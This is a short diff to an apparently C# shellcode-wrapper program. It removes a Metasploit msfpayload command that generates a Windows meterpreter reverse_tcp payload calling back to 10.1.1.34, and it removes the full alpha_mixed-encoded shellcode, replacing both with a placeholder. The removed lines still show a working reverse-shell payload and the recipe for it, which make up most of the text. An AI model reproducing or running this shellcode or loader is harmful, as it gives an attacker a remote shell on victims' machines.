@@ -53,8 +53,8 @@ namespace Wrapper
 
         static void Main()
         {
-            // msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=80 LHOST=10.1.1.34 R| msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
-            string shellcode = "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIil9xlIGpc030qpk9IuUaKbBDlK3bTpNksbTLlKaBwdLKcB4hfo87rjwV019oVQkpllUlcQCLURVLEpza8Ofmc1hGZBJPaBBwNk3bdPLKBbwLs1N0LKsp48LEkpRTCzfahPbplKG8GhNkQHups1Kc8cWL2iLKFTlKgqHVVQKODqkpnLZazofmEQYWUh9p1ehtwssMih7KcMUtSExbrxnk1HgT6an356nktLPKNkBx7l5QN3Nk4DNkC1hPniCtgTtdaKske1pYaJBqIoIprxco0ZNk7bJKMVsmCX4s6RS0S0E8cGRSVRSo1DqxpL3G6F6gYon5H8Z07qePUPFIo4F4BpPhUyMPpkC0ioiE600PBppPg0BpQP2pQxYztOYOM0ioXUJ7BJtERHEZGqeQ12rHWrc07pBpmYzF3ZB01FPWe8MIleT4u1Yon5K5O03DvlioRntH3EHlbHzPLuI2PVIo9ECZ30QztDRvCgBHuRJyiXSo9oYENk4vPjw0BHWpdPEPC00VcZGp0hrxoTscyuyoHUnsF31zUPcfCc67BHERII9XsoioHUEQhC4iO6mU9f3EjLZcAA";
+            
+            string shellcode = "ShellcodeGoesHere";
 
             byte[] sc = new byte[shellcode.Length];
 
